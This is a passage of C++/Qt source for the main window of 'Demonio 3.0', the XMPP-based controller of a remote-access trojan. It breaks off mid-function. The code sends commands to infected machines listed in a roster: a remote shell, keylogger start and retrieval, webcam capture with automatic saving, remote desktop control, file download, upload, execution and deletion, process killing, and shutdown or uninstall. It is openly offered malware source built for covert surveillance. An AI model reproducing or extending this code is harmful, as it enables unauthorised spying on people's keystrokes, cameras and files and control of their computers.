/*
 *  Copyright (C) 2011p Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */
/** Ventana principal del programa, las dem√°s ventanas ser√°n hijas de esta **/
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QTranslator>
#include <qxmpp/QXmppRosterManager.h>
#include <qxmpp/QXmppMessage.h>
#include <QInputDialog>

MainWindow::MainWindow ( QWidget *parent ) :
    QMainWindow ( parent ),
    ui ( new Ui::MainWindow )
{
  QDir::setCurrent(QApplication::applicationDirPath());
  ui->setupUi ( this );
  ui->textoContrasena->setEchoMode(QLineEdit::Password);
  numCapturas = 0;
  manager = new QXmppTransferManager;
  cliente.addExtension(manager);
  escritorio.cliente = &cliente;
  webcam.cliente = &cliente;
  opcionesXmpp.cliente = &cliente;
  esconderFrames();
  ui->frameLogin->show();
  logado = false;
  // Poner los iconos a la lista de opciones
  QIcon icono;
  icono.addFile(":/icons/demonio.png");
  this->setWindowIcon(icono);
  icono.addFile(":/icons/modem.png");
  ui->listaOpciones->item(0)->setIcon(icono);
  icono.addFile(":/icons/document-preview.png");
  ui->listaOpciones->item(1)->setIcon(icono);
  icono.addFile(":/icons/preferencias.png");
  ui->listaOpciones->item(2)->setIcon(icono);
  icono.addFile(":/icons/utilities-system-monitor.png");
  ui->listaOpciones->item(3)->setIcon(icono);
  icono.addFile(":/icons/shell.png");
  ui->listaOpciones->item(4)->setIcon(icono);
  icono.addFile(":/icons/drive-harddisk.png");
  ui->listaOpciones->item(5)->setIcon(icono);
  ventana.setWindowIcon(icono);
  icono.addFile(":/icons/user-desktop.png");
  ui->listaOpciones->item(6)->setIcon(icono);
  escritorio.setWindowIcon(icono);
  icono.addFile(":/icons/camera-web.png");
  ui->listaOpciones->item(7)->setIcon(icono);
  webcam.setWindowIcon(icono);
  icono.addFile(":/icons/input-keyboard.png");
  ui->listaOpciones->item(8)->setIcon(icono);
  icono.addFile(":/icons/emblem-important.png");
  ui->listaOpciones->item(9)->setIcon(icono);
  icono.addFile(":/icons/face-smile-big.png");
  ui->listaOpciones->item(10)->setIcon(icono);
  icono.addFile(":/icons/im-user.png");
  ui->listaOpciones->item(11)->setIcon(icono);

  //Ordenar los frames en un Layout, frames a la derecha y menu de opciones a la izquierda
  layoutPrincipal = new QGridLayout ( ui->centralWidget );
  layoutPrincipal->addWidget ( ui->listaOpciones );
  layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
  layoutPrincipal->addWidget ( ui->frameLogin,0,1 );
  layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
  layoutPrincipal->addWidget ( ui->frameSistema,0,1 );
  layoutPrincipal->addWidget ( ui->frameProcesos,0,1 );
  layoutPrincipal->addWidget ( ui->frameArchivos,0,1 );
  layoutPrincipal->addWidget ( ui->frameLicencia,0,1 );
  layoutPrincipal->addWidget ( ui->frameShellRemota,0,1 );
  layoutPrincipal->addWidget ( ui->frameMensajes,0,1 );
  layoutPrincipal->addWidget ( ui->frameEscritorio,0,1 );
  layoutPrincipal->addWidget ( ui->frameWebcam,0,1);
  layoutPrincipal->addWidget ( ui->frameChat,0,1 );
  layoutPrincipal->addWidget ( ui->frameKeylogger,0,1 );
  layoutPrincipal->addWidget ( ui->notificacionLabel,1,0,1,-11);
  layoutPrincipal->setColumnStretch ( 1,300 );
  layoutPrincipal->setColumnStretch ( 0,100 );


  //conexiones de signals y slots

  connect (ui->botonConectar,SIGNAL(clicked()),this,SLOT(conectar()));
  connect (ui->botonDesconectar,SIGNAL(clicked()),this,SLOT(desconectar()));
  connect (ui->arbolConectados,SIGNAL(clicked(QModelIndex)),this,SLOT(elegirServidor()));
  connect (&cliente,SIGNAL(connected()),this,SLOT(confirmarConectado()));
  connect (&cliente.rosterManager(),SIGNAL(rosterReceived()),this,SLOT(rosterRecibido()));
  connect (&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
  connect(&cliente.rosterManager(),SIGNAL(presenceChanged(QString,QString)),this,SLOT(cambioRoster(QString,QString)));
  connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(recibirArchivo(QXmppTransferJob*)));
  connect(manager,SIGNAL(finished(QXmppTransferJob*)),this,SLOT(transferenciaCompleta(QXmppTransferJob*)));
  connect (this,SIGNAL(procesar(QByteArray)),&escritorio.reco,SLOT(procesarImagen(QByteArray)));
  connect ( ui->botonCerrarServidor,SIGNAL ( clicked() ),this,SLOT ( cerrarServidor() ) );
  connect ( ui->botonArchivos,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaArchivos() ) );
  connect ( ui->botonWebcam,SIGNAL(clicked()),this,SLOT(abrirVentanaWebcam()));
  connect ( ui->botonReiniciar,SIGNAL ( clicked() ),this,SLOT ( reinciar() ) );
  connect ( ui->botonDesinfectar,SIGNAL ( clicked() ),this,SLOT ( desinfectar() ) );
  connect ( ui->botonApagar,SIGNAL(clicked()),this,SLOT(apagarEquipo()));
  connect ( ui->botonReiniciarEquipo,SIGNAL(clicked()),this,SLOT(reiniciarEquipo()));
  connect ( ui->botonMostrar,SIGNAL ( clicked() ),this,SLOT ( enviarMensaje() ) );
  connect ( ui->botonAnadirServidor,SIGNAL(clicked()),this,SLOT(anadirServidor()));
  connect ( ui->botonBorrarServidor,SIGNAL(clicked()),this,SLOT(borrarServidor()));
  connect ( ui->botonEnviar,SIGNAL(clicked()),this,SLOT(shellEnviar()));
  connect ( ui->botonOpcionesXMPP,SIGNAL(clicked()),this,SLOT(abrirVentanaOpcionesXmpp()));
  connect ( ventana.directoriosLista(),SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( directorioCambio() ) );
  connect ( ventana.botonIr(),SIGNAL ( clicked() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.rutaTexto(),SIGNAL ( returnPressed() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.botonAtras(),SIGNAL ( clicked() ),this,SLOT ( archivosAtras() ) );
  connect ( ventana.botonHome(),SIGNAL ( clicked() ),this,SLOT ( archivosHome() ) );
  connect ( ventana.botonRefresco(),SIGNAL ( clicked() ),this,SLOT ( archivosRefresco() ) );
  connect ( ventana.botonDescargar(),SIGNAL ( clicked() ),this,SLOT ( archivosDescargar() ) );
  connect ( ventana.botonSubir(),SIGNAL ( clicked() ),this,SLOT ( archivosSubir() ) );
  connect ( ventana.botonBorrar(),SIGNAL ( clicked() ),this,SLOT ( archivosBorrar() ) );
  connect ( ventana.botonCarpeta(),SIGNAL ( clicked() ),this,SLOT ( archivosCarpeta() ) );
  connect ( ventana.botonEjecutar(),SIGNAL(clicked()),this,SLOT(archivosEjecutar()));
  connect ( ventana.botonCopiar(),SIGNAL(clicked()),this,SLOT(archivosCopiar()));
  connect ( ventana.botonMover(),SIGNAL(clicked()),this,SLOT(archivosMover()));
  connect ( ventana.botonRenombrar(),SIGNAL(clicked()),this,SLOT(archivosRenombrar()));
  connect ( ventana.botonPrevia(),SIGNAL(clicked()),this,SLOT(archivosPrevia()));
  connect ( ventana.botonBorrarCarpeta(),SIGNAL(clicked()),this,SLOT(archivosBorrarCarpeta()));
  connect ( ventana.botonTamano(),SIGNAL(clicked()),this,SLOT(archivosTamano()));
  connect ( ventana.comboUnidad(),SIGNAL(currentIndexChanged(QString)),this,SLOT(cambioComboUnidad()));
  connect ( ui->botonEscritorio,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaEscritorio() ) );
  connect ( ui->menuIdioma,SIGNAL(triggered(QAction*)),this,SLOT(traducir(QAction *)));
  connect ( ui->actionOpciones,SIGNAL(triggered()),this,SLOT(opcionesServidor()));
  connect ( ui->actionAcerca_de_Qt,SIGNAL(triggered()),this,SLOT(showAboutQt()));
  connect ( ui->actionAcerca_de,SIGNAL(triggered()),this,SLOT(about()));
  connect ( ui->actionLicencia,SIGNAL(triggered()),this,SLOT(licencia()));
  connect ( ui->actionSalir,SIGNAL(triggered()),this,SLOT(close()));
  connect ( ui->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
  connect ( ui->botonAbrirChat,SIGNAL(clicked()),this,SLOT(abrirChat()));
  connect ( ui->botonCerrarChat,SIGNAL(clicked()),this,SLOT(cerrarChat()));
  connect (ui->botonActivarKeylogger,SIGNAL(clicked()),this,SLOT(activarKey()));
  connect (ui->botonDesactivarKeylogger,SIGNAL(clicked()),this,SLOT(desactivarKey()));
  connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
  connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
  connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
  connect (&escritorio,SIGNAL(click(QString)),this,SLOT(clicado(QString)));
  connect (&escritorio,SIGNAL(tecla(QString)),this,SLOT(enviarTecla(QString)));
  connect (ui->botonActualizar,SIGNAL(clicked()),this,SLOT(actualizarProcesos()));
  connect (ui->botonMatar,SIGNAL(clicked()),this,SLOT(matarProceso()));
}

MainWindow::~MainWindow()
{

  delete ui;
}
void MainWindow::changeEvent ( QEvent *e )
{
  /** En esta funci√≥n vemos cuando llega el evento LanguageChange y retraducimos la interfaz **/
  QMainWindow::changeEvent ( e );
  switch ( e->type() )
    {
    case QEvent::LanguageChange:
      ui->retranslateUi ( this );
      break;
    default:
      break;
    }
}
bool MainWindow::event(QEvent *event)
{
    /** Esta funcion maneja los eventos que llegan a la ventana principal **/
    switch ( event->type() )
    {
    case QEvent::Close:
        QApplication::exit();
        break;
    default:
        this->QMainWindow::event(event);
    }
    return true;
}
void MainWindow::esconderFrames()
{
  /** Esta funcion esconde todos los frames **/  
  ui->frameLogin->hide();
  ui->frameConexion->hide();
  ui->frameInformacion->hide();
  ui->frameSistema->hide();
  ui->frameProcesos->hide();
  ui->frameShellRemota->hide();
  ui->frameArchivos->hide();
  ui->frameLicencia->hide();
  ui->frameMensajes->hide();
  ui->frameEscritorio->hide();
  ui->frameWebcam->hide();
  ui->frameChat->hide();
  ui->frameKeylogger->hide();
}
void MainWindow::listaOpciones()
{
  /** Esta funcion es llamada cuando selecionamos algun Item de la lista de opciones **/
  int opcion = ui->listaOpciones->currentIndex().row();
  esconderFrames();
  switch ( opcion )
    {
    case ( 0 ) :
    {
      if(logado == true)
      {
        ui->frameConexion->show();
      }
      else
      {
        ui->frameLogin->show();
      }
      break;
    }
    case ( 1 ) :
    {
      ui->frameInformacion->show();
      break;
    }
    case ( 2 ) :
    {
      ui->frameSistema->show();
      break;
    }
    case ( 3 ) :
    {
      ui->frameProcesos->show();
      break;
    }
    case ( 4 ) :
    {
      ui->frameShellRemota->show();
      break;
    }
    case ( 5 ) :
    {
      ui->frameArchivos->show();
      break;
    }
    case ( 6 ) :
    {
      ui->frameEscritorio->show();
      break;
    }
    case ( 7 ) :
    {
      ui->frameWebcam->show();
      break;
    }
    case ( 8 ) :
    {
      ui->frameKeylogger->show();
      break;
    }
    case ( 9 ) :
    {
      ui->frameMensajes->show();
      break;
    }
    case ( 10 ) :
    {
        break;
    }
    case ( 11 ) :
    {
        ui->frameChat->show();
        break;
    }
    default:
    {

    }
    }
}
void MainWindow::conectar()
{
    cliente.connectToServer(ui->textoUsuario->text(),ui->textoContrasena->text());
    ui->notificacionLabel->setText(tr("conectando..."));
}
void MainWindow::desconectar()
{
    cliente.disconnect();
    ui->textoUsuario->clear();
    ui->textoContrasena->clear();
    logado = false;
    ui->frameLogin->show();
    ui->frameConexion->hide();
    ui->arbolConectados->clear();
    listaItems.clear();
    ui->notificacionLabel->setText(tr("desconectado"));
}
void MainWindow::confirmarConectado()
{
    ui->notificacionLabel->setText(tr("conectado"));
}
void MainWindow::rosterRecibido()
{
    logado = true; //cuando recibimos el roster ya mostramos el frame con la lista de conectados
    ui->frameLogin->hide();
    ui->frameConexion->show();
    int i,j;
    QStringList contactos = cliente.rosterManager().getRosterBareJids();
    for(i=0;i<contactos.length();i++)
    {
        QTreeWidgetItem *item = new QTreeWidgetItem();
        item->setText(0,contactos[i]);
        QStringList recursos = cliente.rosterManager().getResources(contactos[i]);
        QIcon online;
        online.addFile(":/icons/user-offline.png");
        item->setIcon(0,online);
        for(j=0;j<recursos.length();j++)
        {
            item->addChild(new QTreeWidgetItem());
            item->child(j)->setText(0,recursos[j]);
            online.addFile(":/icons/user-online.png");
            item->setIcon(0,online);
            item->child(j)->setIcon(0,online);
        }
        listaItems.append(item);
    }
    ui->arbolConectados->addTopLevelItems(listaItems);
}
void MainWindow::cambioRoster(QString barejid, QString resource)
{
    if(cliente.rosterManager().isRosterReceived() == true)
    {
        QIcon online;
        online.addFile(":/icons/user-online.png");
        if(ui->arbolConectados->findItems(barejid,Qt::MatchExactly).size() == 0)
        {
            QTreeWidgetItem *item = new QTreeWidgetItem();
            item->setText(0,barejid);
            ui->arbolConectados->addTopLevelItem(item);
        }
        if(cliente.rosterManager().getPresence(barejid,resource).type() == QXmppPresence::Available)
        {
            QTreeWidgetItem *item = new QTreeWidgetItem();
            item->setText(0,resource);
            item->setIcon(0,online);
            ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->addChild(item);
        }
        if(cliente.rosterManager().getPresence(barejid,resource).type() == QXmppPresence::Unavailable)
        {
            int i=0;
            while(i<ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->childCount() && ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->child(i)->text(0) != resource) //busqueda lineal
            {
                i++;
            }
            ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->takeChild(i);
            if(ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->childCount() == 0)
            {
                online.addFile(":/icons/user-offline.png");
            }
        }
        ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->setIcon(0,online);
    }
}
void MainWindow::elegirServidor()
{
    if(ui->arbolConectados->currentItem()->parent() != NULL)
    {
        servidor = ui->arbolConectados->currentItem()->parent()->text(0) + "/" + ui->arbolConectados->currentItem()->text(0);
        ventana.servidor = servidor;
        escritorio.servidor = servidor;
        webcam.servidor = servidor;
        opcionesXmpp.servidor = servidor;
        pedirInformacion();
        ui->notificacionLabel->setText("Conectado a: " + servidor);
    }
}
void MainWindow::anadirServidor()
{
    QXmppPresence solicitud;
    solicitud.setTo(QInputDialog::getText(this,"AÒadir servidor","Direccion del servidor"));
    solicitud.setType(QXmppPresence::Subscribe);
    cliente.sendPacket(solicitud);
}
void MainWindow::borrarServidor()
{
    if(ui->arbolConectados->topLevelItemCount() != 0)
    {
        if(ui->arbolConectados->currentItem() != NULL)
        {
            if(ui->arbolConectados->currentItem()->parent() == NULL)
            {
                cliente.rosterManager().removeRosterEntry(ui->arbolConectados->currentItem()->text(0));
                ui->arbolConectados->takeTopLevelItem(ui->arbolConectados->currentIndex().row());
            }
        }
    }
}
void MainWindow::showAboutQt()
{
  /** Muestra informacion sobre Qt **/
  QApplication::aboutQt();
}
void MainWindow::licencia()
{
  /** Muestra la licencia **/
  QFile licencia;
  licencia.setFileName ( ":/rc/gpl-3.0.txt" );
  licencia.open ( QIODevice::ReadOnly );
  ui->licenciaText->setText ( licencia.readAll() );
  licencia.close();
  esconderFrames();
  ui->frameLicencia->show();
}
void MainWindow::about()
{
  /** Muestra informacion sobre Demonio **/
  mensajeEmergente.setText(tr("Demonio 3.0 <br>Programado por: Alberto Pajuelo Montes<br>Email: paju1986@gmail.com<br>Web del proyecto: <a href=\"http://sourceforge.net/projects/demonio/\">http://sourceforge.net/projects/demonio/</a><br>Blog del autor: <a href=\"http://albertopajuelo.blogspot.com\">http://albertopajuelo.blogspot.com</a>"));
  mensajeEmergente.show();
}
void MainWindow::opcionesServidor()
{
    /** abre la ventana de opciones del servidor **/
    opciones.show();
}

void MainWindow::llegadaDatos(const QXmppMessage &mensaje)
{
  /** Esta funcion se ejecuta cuando llegan datos del socket principal **/
  QString datos = mensaje.body();
  QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
  if (parametros[0] == "ident") //Peticion de autentificacion por parte del servidor
  {
    bool ok = false; //Variable de control de si se ha introducido contraseÒa o cancelado
    QString contrasena = QInputDialog::getText(this,"Identificacion","ContraseÒa",QLineEdit::Password,"",&ok);
    if(ok == true)
    {
        cliente.sendMessage(servidor,"pass|@|" +  contrasena); //Enviar la contraseÒa
        pedirInformacion();
    }
  }
  if( datos == "pong") //Si recibe respuesta de un ping
  {
    mensajeEmergente.setText("responde");
    mensajeEmergente.show();
  }
  if ( parametros[0] == "shell" ) //Si llegan datos de una shell remota
    {
      ui->salidaTexto->setText ( parametros[1] );
    }
  if ( parametros[0] == "home" ) //Si llega la ruta del directorio home
    {
      ventana.establecerRuta ( parametros[1] );
     cliente.sendMessage(servidor, "archivos|@|" + parametros[1]);
    }
  if (parametros[0] == "tamano")
  {
    mensajeEmergente.setText(tr("TamaÒo: ") + parametros[1] + "B");
    mensajeEmergente.show();
  }
  if (parametros[0] == "unidades") //Si llega la lista de unidades
  {
    ventana.comboUnidad()->clear();
    ponerUnidades(parametros);
  }
  if ( parametros[0] == "file" ) //Si llega la lista de ficheros
    {
      ponerArchivos ( parametros );
     cliente.sendMessage(servidor, "directorios|@|" + ventana.ruta);
    }
  if ( parametros[0] == "folder" ) //si llega la lista de archivos
    {
      ponerDirectorios ( parametros );
    }
  if (parametros[0] == "chat") { //Si llegan mensajes del chat
      this->ponerMensajeChat(parametros[1],ui->textoNickServidor->text());
  }
  if (parametros[0] == "teclas") //Si llegan teclas del keylogger
  {
    ui->textTeclas->setText(parametros[1]);
  }  
  if (parametros[0] == "informacion") //Si llega informacion del sistema
  {
    //Ponemos cada parametro en su respectiva variable
    QString informacion;
    QString so = parametros[1];
    QString version = parametros[2];
    QString homePath = parametros[3];
    QString tempPath = parametros[4];
    escritorio.ancho = parametros[5].toInt();
    escritorio.alto = parametros[6].toInt();
    QString fecha = parametros[7];
    QString hora = parametros[8];
    this->alias = parametros[9];
    //Mostramos la informacion en pantalla
    informacion = "Sistema operativo: " + so + "<br>";
    informacion = informacion + tr("Versi&oacute;n: ") + version +"<br>";
    informacion = informacion + tr("Directorio del usuario: ") + homePath + "<br>";
    informacion = informacion + tr("Directorio temporal: ") + tempPath + "<br>";
    informacion = informacion + tr("Resoluci&oacute;n de pantalla: ") + parametros[5] + "X" + parametros[6] + "<br>";
    informacion = informacion + tr("Fecha del sistema: ") + fecha + "<br>";
    informacion = informacion + tr("Hora del sistema: ") + hora + "<br>";
    ui->informacionSistemaTexto->setHtml(informacion);
    //La resolucion tambien la ponemos en el titulo de la ventana de captura de pantalla
    escritorio.setWindowTitle(tr("Escritorio remoto - Previsualizacion - Resolucion: ") + parametros[5] + "X" + parametros[6]);
    this->setWindowTitle(tr("Demonio - Cliente - Conectado a: ") + this->alias);
    //ui->servidoresLista->currentItem()->setText(this->alias); //Poner en la lista el alias en vez de la IP
    escritorio.reco.imagen1 = new QImage(parametros[5].toInt(),parametros[6].toInt(),QImage::Format_RGB32);
    escritorio.reco.imagen1->fill(QColor(0,0,0).rgb());
    cliente.sendMessage(servidor,"unidades|@|");
  }
  if(parametros[0] == "listaprocesos")
  {
    int i;
    for(i=1;i<parametros.size();i++)
    {
        ui->listProcesos->addItem(parametros[i]);
    }
  }
}

void MainWindow::recibirArchivo(QXmppTransferJob* transferencia)
{

    if(transferencia->fileInfo().name() == "|@|captura|@|")
    {
        escritorio.refresco.stop();
        datos.clear();
        buffer.setBuffer(&datos);
        buffer.open(QIODevice::WriteOnly);
        transferencia->accept(&buffer);
    }
    else
    {
        if(transferencia->fileInfo().name() == "|@|mini|@|")
        {
            datosMini.clear();
            bufferMini.setBuffer(&datosMini);
            bufferMini.open(QIODevice::WriteOnly);
            transferencia->accept(&bufferMini);
        }
        else
        {
            if(transferencia->fileInfo().name() == "|@|webcam|@|")
            {
                datosWebcam.clear();
                bufferWebcam.setBuffer(&datosWebcam);
                bufferWebcam.open(QIODevice::WriteOnly);
                transferencia->accept(&bufferWebcam);
            }
            else
            {
                archivoRecibido = new QFile(ventana.rutaArchivo);
                archivoRecibido->open(QFile::WriteOnly);
                connect(transferencia,SIGNAL(progress(qint64,qint64)),this,SLOT(progreso(qint64,qint64 )));
                transferencia->accept(archivoRecibido);
            }
        }
    }
}
void MainWindow::transferenciaCompleta(QXmppTransferJob *transferencia)
{
    if(transferencia->direction() == QXmppTransferJob::IncomingDirection)
    {
        if(transferencia->fileInfo().name() == "|@|captura|@|")
        {
            emit procesar(datos);
        }
        else
        {
            if(transferencia->fileInfo().name() == "|@|mini|@|")
            {
                QPixmap imagen;
                imagen.loadFromData(bufferMini.buffer());
                ventana.labelMiniatura()->setPixmap(imagen);
                ventana.rutaArchivo = "";
                ventana.barraProgresoTransferencia()->setValue(0);
                bufferMini.close();
            }
            else
            {
                if(transferencia->fileInfo().name() == "|@|webcam|@|")
                {
                    QPixmap imagen;
                    imagen.loadFromData(bufferWebcam.buffer());
                    webcam.imagenWebcam()->setPixmap(imagen);
                    if (webcam.guardarAutomaticamente()->isChecked())
                    {
                        QString capGuarda;
                        this->numCapturas++;
                        capGuarda.setNum(this->numCapturas);
                        QFile guardar;
                        guardar.setFileName(capGuarda + ".jpg");
                        guardar.open(QFile::WriteOnly);
                        guardar.write(bufferWebcam.buffer());
                        guardar.close();
                    }
                    if(webcam.capturasAutomaticas()->isChecked())
                    {
                       webcam.capturar();
                    }
                    bufferWebcam.close();
                }
                else
                {
                    archivoRecibido->close();
                    delete archivoRecibido;
                }
            }
        }
    }
}

void MainWindow::progreso(qint64 hecho,qint64 total)
{
    /** Esta funcion muestra el progreso de una transferencia de archivos **/
    if(total != 0)
    {
        ventana.barraProgresoTransferencia()->setValue((hecho/total)*100);
    }
}

void MainWindow::cerrarServidor()
{
  /** cierra el servdor **/
 cliente.sendMessage(servidor, "cerrar" );
}
void MainWindow::shellEnviar()
{
  /**Esta funcion envia datos a una shell remota **/
  QString datos = "shell|@|" + ui->entradaTexto->text();
 cliente.sendMessage(servidor, datos );
}
void MainWindow::reinciar()
{
  /** Esta funcion envia la orden de reiniciar el servidor **/
 cliente.sendMessage(servidor, "reiniciar" );
}
void MainWindow::desinfectar()
{
  /** Esta funcion envia la orden de desinfectar el sistema **/
 cliente.sendMessage(servidor, "desinfectar" );
}
void MainWindow::abrirVentanaArchivos()
{
  /** Abre la ventana del administrador de archivos **/
  ventana.limpiarArchivos();
  ventana.show();
}
void MainWindow::abrirVentanaWebcam()
{
    /** Abre la ventana de las capturas de webcam **/
    this->webcam.show();
}
void MainWindow::abrirVentanaOpcionesXmpp()
{
    /** Abre la ventana de opciones de xmpp **/
    this->opcionesXmpp.show();
}
void MainWindow::cambioComboUnidad()
{
    /** Esta funcion se ejecuta cuando se elije una unidad en el administrador de archivos **/
    ventana.limpiarArchivos();
    ventana.establecerRuta ( ventana.comboUnidad()->currentText() );
   cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
}
void MainWindow::ponerUnidades(QStringList unidades)
{
    /**Pone las unidades pasadas como parametros en el combo de unidades **/
    int i;
    for ( i=1;i<unidades.size() -1;i++ )
      {
        ventana.ponerUnidad ( unidades[i] );
      }
}
void MainWindow::ponerArchivos ( QStringList archivos )
{
  /** pone los archivos pasados como parametro en lista de archivos del administrador de archivos **/
  int i;
  for ( i=1;i<archivos.size() -1;i++ )
    {
      ventana.ponerArchivo ( archivos[i] );
    }
}
void MainWindow::ponerDirectorios ( QStringList directorios )
{
  /** pone los directorios pasados como parametros en la lista de directorios del administrador de archivos **/
  int i;
  for ( i=2;i<directorios.size() -1;i++ )
    {
      ventana.ponerDirectorio ( directorios[i] );
    }
}
QString MainWindow::obtenerRutaAnterior(QString rutaActual){
    /** Obtiene la ruta anterior de una ruta pasada como par·metro **/
    int i;
    QString rutaAnterior;
    rutaActual.replace("\\","/");
    QStringList cachosRuta = rutaActual.split("/");
    rutaAnterior = cachosRuta[0];
    for (i=1;i< cachosRuta.size() - 1;i++){
        rutaAnterior = rutaAnterior + "/" + cachosRuta[i];
    }
    return rutaAnterior;
}
void MainWindow::directorioCambio()
{
  /**Esta funcion se ejecuta cuando se seleciona un directorio en la lista de directorios del administrador de archivos **/
  QString nuevoDirectorio = ventana.directoriosLista()->currentItem()->text();
  if ( nuevoDirectorio == ".." ) //Si el directorio es .. significa volver atras
    {
      ventana.rutaAnterior = obtenerRutaAnterior ( ventana.ruta );
      ventana.establecerRuta ( ventana.rutaAnterior );
      ventana.limpiarArchivos();
     cliente.sendMessage(servidor, "archivos|@|" + ventana.rutaAnterior );
    }
  else
    {
      ventana.ruta = ventana.ruta + "/" + nuevoDirectorio;
      ventana.establecerRuta ( ventana.ruta );
      ventana.limpiarArchivos();
     cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
    }
}
void MainWindow::archivosIr()
{
  /** Esta funcion envia la ruta a la que queremos navegar en el administrador de archivos **/
  ventana.limpiarArchivos();
  ventana.establecerRuta ( ventana.rutaTexto()->text() );
 cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
}
void MainWindow::archivosAtras()
{
  /** Envia la ruta anterios a la que estabamos **/
  ventana.rutaAnterior = obtenerRutaAnterior ( ventana.ruta );
  ventana.establecerRuta ( ventana.rutaAnterior );
  ventana.limpiarArchivos();
 cliente.sendMessage(servidor, "archivos|@|" + ventana.rutaAnterior );
}
void MainWindow::archivosHome()
{
  /** pide recibir la ruta del directorio home **/
  ventana.limpiarArchivos();
 cliente.sendMessage(servidor, "home" );
}
void MainWindow::archivosRefresco()
{
  /** refresca la vista de archivos **/
  ventana.limpiarArchivos();
 cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
}
void MainWindow::archivosDescargar()
{
    /** Manda descargar un archivo **/
    if( ventana.archivosLista()->currentRow() >= 0) {
        QFileDialog dialogo;
        QString dir;
        dir = QDir::homePath() + "/" + ventana.archivosLista()->currentItem()->text();
        ventana.rutaArchivo = dialogo.getSaveFileName (&ventana,"Guardar archivo",dir );
        dialogo.show();
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        cliente.sendMessage(servidor, "get|@|" + rutaArchivo );
    }
}
void MainWindow::archivosSubir()
{
  /** Manda subir un archivo **/
  QFileDialog archivo;
  QString nombreArchivo = archivo.getOpenFileName (&ventana,"Abrir archivo",QDir::homePath() );
  QStringList cachosArchivo = nombreArchivo.split ( "/" );
  cliente.sendMessage(servidor, "put|@|" + cachosArchivo.last() );
  job = manager->sendFile(servidor,nombreArchivo);
}

void MainWindow::archivosBorrar()        
{
    /** Manda borrar un archivo **/
    if( ventana.archivosLista()->currentRow() >= 0) {
        //Crear una ventana de confirmacion
        QMessageBox confirmacion(&ventana);
        confirmacion.setWindowTitle(tr("ConfirmaciÛn"));
        confirmacion.setText(tr("øEst·s seguro de que desea borrar el archivo?"));
        confirmacion.addButton(tr("No"),QMessageBox::NoRole);
        confirmacion.addButton(tr("Si"),QMessageBox::YesRole);
        if(confirmacion.exec())
        {
            QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
           cliente.sendMessage(servidor, "remove|@|" + rutaArchivo );
        }
    }
}
void MainWindow::archivosCarpeta()
{
  QString nombre = QInputDialog::getText ( &ventana,"Nombre de la carpeta","Nombre de la carpeta" );
 cliente.sendMessage(servidor, "createfolder|@|" + nombre );

}
void MainWindow::archivosEjecutar()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
       cliente.sendMessage(servidor, "execute|@|" + rutaArchivo );
    }
}
void MainWindow::archivosCopiar()
{
    if(ventana.botonMover()->text() == "Pegar") //Para evitar interferencias con el boton mover
    {
        ventana.botonMover()->setText("Mover");
    }
    if(ventana.botonCopiar()->text() == "Copiar")
    {
        if( ventana.archivosLista()->currentRow() >= 0) {//Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonCopiar()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonCopiar()->setText("Copiar");
        cliente.sendMessage(servidor,"copiar|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre);
    }
}
void MainWindow::archivosMover()
{
    if(ventana.botonCopiar()->text() == "Pegar") //Para evitar interferencias con el boton copiar
    {
        ventana.botonCopiar()->setText("Copiar");
    }
    if(ventana.botonMover()->text() == "Mover")
    {
        if( ventana.archivosLista()->currentRow() >= 0) { //Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonMover()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonMover()->setText("Mover");
        cliente.sendMessage(servidor,"mover|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre);
    }
}
void MainWindow::archivosRenombrar()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        QString nombre = QInputDialog::getText ( &ventana,"Nuevo nombre","Nuevo nombre" );
